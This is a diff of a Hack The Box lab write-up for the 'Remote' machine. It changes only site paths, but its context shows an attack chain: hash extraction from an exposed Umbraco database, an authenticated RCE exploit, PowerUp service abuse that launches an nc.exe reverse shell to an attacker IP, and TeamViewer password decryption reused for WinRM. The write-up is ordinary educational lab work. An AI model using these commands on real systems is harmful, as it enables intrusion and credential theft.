@@ -1,10 +1,10 @@
 ---
-layout: walkthrough
+layout: writeup
 title: Remote
-description: HTB walkthrough
-logo: /assets/img/walkthroughs/remote_logo.png
+description: HTB writeup
+logo: /assets/img/writeups/remote_logo.png
 show-avatar: false
-permalink: /walkthroughs/remote.html
+permalink: /writeups/remote.html
 OS: windows
 difficulty: Easy
 release: 21 Mar 2020
@@ -88,7 +88,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 There is a lot going on, but if we start with the web page and manually enumerate it by clicking all the links and seeing where they go, we will find some information on the contact page
 
-![Umbraco Forms](/assets/img/walkthroughs/remote_umbracoforms.png)
+![Umbraco Forms](/assets/img/writeups/remote_umbracoforms.png)
 
 This tells us that Umbraco is running, which is an open source CMS, as well as directs us to the login page when we click it. We don't find anything else of note, so lets move on to the nfs share we see running from the nmap scan. If we take a look at it with showmount
 
@@ -108,17 +108,17 @@ If we then browse the /mnt/tmp directory, we see what looks like the name sugges
 
 If we look at the Web.config file in the base directory we can get the version of Umbraco that is running
 
-![umbraco version](/assets/img/walkthroughs/remote_umbracoversion.png)
+![umbraco version](/assets/img/writeups/remote_umbracoversion.png)
 
 via google we see there is a remote code execution exploit for this version however it requires authentication. So let's dig a little deeper. 
 
 If we look in the App_Data directory we will see an Umbraco.sdf file. This is a SQL Server Compact formated file, which should be the database that stores the login information. I couldn't get it to open in LINQPad as it appears to be corrupted (not sure if this was on my end or really is that way) but it doesn't matter because if we just view it from the command line checking for any strings we will find several password hashes
 
-![umbraco_dbstring](/assets/img/walkthroughs/remote_dbstrings.png)
+![umbraco_dbstring](/assets/img/writeups/remote_dbstrings.png)
 
 If we check the admin hash at <a img="https://crackstation.net">crackstation</a> we see it cracks to 'baconandcheese'
 
-![remote_adminhtb](/assets/img/walkthroughs/remote_adminhtb.png)
+![remote_adminhtb](/assets/img/writeups/remote_adminhtb.png)
 
 So now that we have credentials we can use the RCE exploit found <a href="https://github.com/noraj/Umbraco-RCE">here</a>. 
 
@@ -213,7 +213,7 @@ python3 exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180'
 
 We pop a shell and have access to the user.txt
 
-![user flag](/assets/img/walkthroughs/remote_usershell.png)
+![user flag](/assets/img/writeups/remote_usershell.png)
 
 <h4 align="center">On To Root!</h4>
 
@@ -227,7 +227,7 @@ Upload the powershell script *PowerUp.ps1* (using the same technique we uploaded
 powershell -exec bypass -command "& {import-module .\powerup.ps1; invoke-allchecks}"
 ```
 
-![powerup](/assets/img/walkthroughs/remote_powerup.png)
+![powerup](/assets/img/writeups/remote_powerup.png)
 
 We see the service permisions on UsoSvc are exploitable, and all we have to do is simply run the function it suggests using the same nc.exe we uploaded earlier to get a system shell
 
@@ -235,7 +235,7 @@ We see the service permisions on UsoSvc are exploitable, and all we have to do i
 powershell -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-ServiceAbuse -ServiceName UsoSvc -Command 'c:\Users\Public\nc.exe 10.10.14.41 1234 -e cmd.exe'}"
 ```
 
-![root1](/assets/img/walkthroughs/remote_root1.png)
+![root1](/assets/img/writeups/remote_root1.png)
 
 
 <h5 align="left">Method 2:</h5>
@@ -246,7 +246,7 @@ If we enumerate the fille system we will see that TeamViewer7 is installed. Team
 reg query hklm\software\wow6432node\teamviewer\version7
 ```
 
-![teamviewer registry](/assets/img/walkthroughs/remote_teamviewerregistry.png)
+![teamviewer registry](/assets/img/writeups/remote_teamviewerregistry.png)
 
 If we then run the python decryption script from the above site
 
@@ -273,10 +273,10 @@ password = raw_un.decode('utf-16')
 print(password)
 ```
 
-![!R3m0t3!](/assets/img/walkthroughs/remote_teamviewpassword.png)
+![!R3m0t3!](/assets/img/writeups/remote_teamviewpassword.png)
 
 We have the password for TeamViewer. Thinking that maybe they use the same password for all the remote management tools, we attempt to use it to login as administrator to WinRm that is running on port 5985. Using the tool *evil-winrm* 
 
-![evilwin](/assets/img/walkthroughs/remote_evilwinrm.png)
+![evilwin](/assets/img/writeups/remote_evilwinrm.png)
 
 We are met with success and have gained access to the root.txt
